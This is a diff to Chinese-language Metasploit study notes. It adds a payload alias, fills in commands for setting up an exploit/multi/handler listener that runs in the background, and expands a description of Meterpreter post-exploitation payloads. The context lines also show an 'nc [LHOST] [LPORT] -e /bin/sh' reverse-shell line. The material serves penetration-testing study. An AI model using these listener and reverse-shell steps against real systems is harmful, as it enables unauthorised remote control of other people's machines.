@@ -57,6 +57,8 @@ msf > debug                    # 显示诊断信息, 在故障发生后使用
 
 ## 载荷
 
+**别名**: 攻击载荷, 有效载荷.  
+
 MSF 中的载荷(payload)共有以下三种:  
 
 - Singles: 包含完整的功能, 不依赖 MSF, 因此不需要通过 exploit/multi/handler 来建立连接.
@@ -97,12 +99,16 @@ nc [LHOST] [LPORT] -e /bin/sh
 使用 handler 来与目标中的 stager 建立连接, 并上传 stage.  
 
 ```sh
-
+msf > use exploit/multi/handler
+msf > set payload [id/value]
+# ... 设置载荷中的参数 ...
+msf > set ExitOnSession false # 建立连接后不结束监听
+msf > run -j                  # 开始监听并作为后台任务运行, 因为这是一个堵塞操作
 ```
 
 ## [Meterpreter](https://github.com/rapid7/metasploit-payloads)
 
-Meterpreter 是一种特殊的多功能载荷, 充分利用其功能可以使后渗透攻击变得十分方便.  
+Meterpreter 是一种特殊的多功能载荷, 可以动态加载/执行/卸载脚本和插件, 充分利用其功能可以使后渗透攻击变得十分方便.  
 以下列举几个常用功能:  
 
 ```sh
